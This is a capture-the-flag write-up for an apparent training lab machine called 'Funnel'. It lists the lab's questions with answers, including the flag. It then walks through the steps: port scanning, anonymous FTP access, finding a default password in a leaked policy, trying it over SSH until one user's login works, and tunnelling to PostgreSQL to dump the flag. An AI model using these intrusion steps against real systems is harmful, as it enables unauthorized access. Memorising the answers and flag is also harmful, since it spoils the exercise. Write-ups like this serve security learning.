# Tasks
- How many TCP ports are open?
	- 2
- What is the name of the directory that is available on the FTP server?
	- mail_backup
- What is the default account password that every new member on the "Funnel" team should change as soon as possible?
	- funnel123#!#
- Which user has not changed their default password yet?
	- christine
- Which service is running on TCP port 5432 and listens only on localhost?
	- postegresql
- Since you can't access the previously mentioned service from the local machine, you will have to create a tunnel and connect to it from your machine. What is the correct type of tunneling to use? remote port forwarding or local port forwarding?
	- local port forwarding
- What is the name of the database that holds the flag?
	- secrets
- Could you use a dynamic tunnel instead of local port forwarding? Yes or No.
	- Yes
- Submit root flag
	- cf277664b1771217d7006acdea006db1


# Steps
- First, let's do rustscan run first.
```
rustscan --ulimit 5000 --addresses "10.129.1.71" --top -- -sC -sV
```
- From the results, we see that we have an FTP server given to us
```
PORT   STATE SERVICE REASON         VERSION  
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3  
| ftp-syst:    
|   STAT:    
| FTP server status:  
|      Connected to ::ffff:10.10.14.21  
|      Logged in as ftp  
|      TYPE: ASCII  
|      No session bandwidth limit  
|      Session timeout in seconds is 300  
|      Control connection is plain text  
|      Data connections will be plain text  
|      At session startup, client count was 2  
|      vsFTPd 3.0.3 - secure, fast, stable  
|_End of status  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup  
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)  
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1  
f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZ  
rqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=  
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)  
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=  
|   256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR  
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
- We can then connect via ftp to the server
```
ftp 10.129.1.71
```
- We are able to use anonymous login, so we do that
```
Connected to 10.129.1.71.  
220 (vsFTPd 3.0.3)  
Name (10.129.1.71:root): anonymous  
331 Please specify the password.  
Password:    
230 Login successful.  
Remote system type is UNIX.  
Using binary mode to transfer files.  
ftp>
```
- On this server, we have a mail_backup folder with a password policy and welcome document within it.
- After downloading it, we get this some interesting stuff
- Welcome email:
```
Frome: root@funnel.htb  
To: optimus@funnel.htb albert@funnel.htb andreas@funnel.htb christine@funnel.htb maria@funnel.htb  
Subject:Welcome to the team!  
  
Hello everyone,  
We would like to welcome you to our team.    
We think you’ll be a great asset to the "Funnel" team and want to make sure you get settled in as smoothly as possible.  
We have set up your accounts that you will need to access our internal infrastracture. Please, read through the attached password policy with extreme care.  
All the steps mentioned there should be completed as soon as possible. If you have any questions or concerns feel free to reach directly to your manager.    
We hope that you will have an amazing time with us,  
The funnel team.
```
- Password policy:
```
Password Policy 🔐
Overview
Passwords are a key part of our cyber security strategy. The purpose of this policy
is to make sure all resources and data receive adequate password protection. We
cannot overstate the importance of following a secure password policy and
therefore have provided this document for your guidance. The policy covers all
users who are responsible for one or more account or have access to any resource
that requires a password.
Password Creation:
• All passwords should be sufficiently complex and therefore difficult for anyone to
guess.
• In addition, employees should also use common sense when choosing
passwords. They must avoid basic combinations that are easy to crack. For
instance, choices like “password,” “password1” and “Pa$$w0rd” are equally bad
from a security perspective.
• A password should be unique, with meaning only to the user who chooses it.
• In some cases, it will be necessary to change passwords at certain frequencies.
• Default passwords — such as those created for new users — must be changed
as quickly as possible. For example the default password of “funnel123#!#” must
be changed immediately.
```
- So, it looks like new members have default credentials that they NEED to change.
- However, it's possible that someone forgot to change their credentials.
- From the email, we are given 4 options: albert, andreas, christine, and maria
- We can test by attempting to connect via SSH. We are able to find a hit with christine, so we have this set of credentials to connect with:
```
username: christine
password: funnel123#!#
```
- Using ss, we are able to see that PostgresSQL is being ran on this machine
- There is a problem though: psql is not installed on the machine, but it is given on our machine (in this case, our Exegol container has psql installed)
- We also don't have sudo privileges, so we can't download and install the relevant package
- So, we are going to use tunneling to get this working
- This can be achieved with this
```
ssh -L 1234:localhost:5432 christine@10.129.1.71
```
- With that connection established, then we can use psql to connect into that database
```
psql -U christine -h localhost -p 1234
```
- We can then list out the databases we have, in which secrets stands out to us
```
christine=# \l  
                                                 List of databases  
  Name    |   Owner   | Encoding |  Collate   |   Ctype    | ICU Locale | Locale Provider |    Access privileges       
-----------+-----------+----------+------------+------------+------------+-----------------+-------------------------  
christine | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            |    
postgres  | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            |    
secrets   | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            |    
template0 | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | =c/christine           +  
          |           |          |            |            |            |                 | christine=CTc/christine  
template1 | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | =c/christine           +  
          |           |          |            |            |            |                 | christine=CTc/christine  
(5 rows)
```
- We can then connect to there using \c secrets and then see the contents using \dt
```
christine=# \c secrets  
psql (15.13 (Debian 15.13-0+deb12u1), server 15.1 (Debian 15.1-1.pgdg110+1))  
You are now connected to database "secrets" as user "christine".  
secrets=# \dt  
        List of relations  
Schema | Name | Type  |   Owner      
--------+------+-------+-----------  
public | flag | table | christine  
(1 row)
```
- The flag entry seems interesting! Let's dump the value, and that gives us our flag!
```
secrets=# SELECT* FROM flag;  
             value                  
----------------------------------  
cf277664b1771217d7006acdea006db1  
(1 row)
```
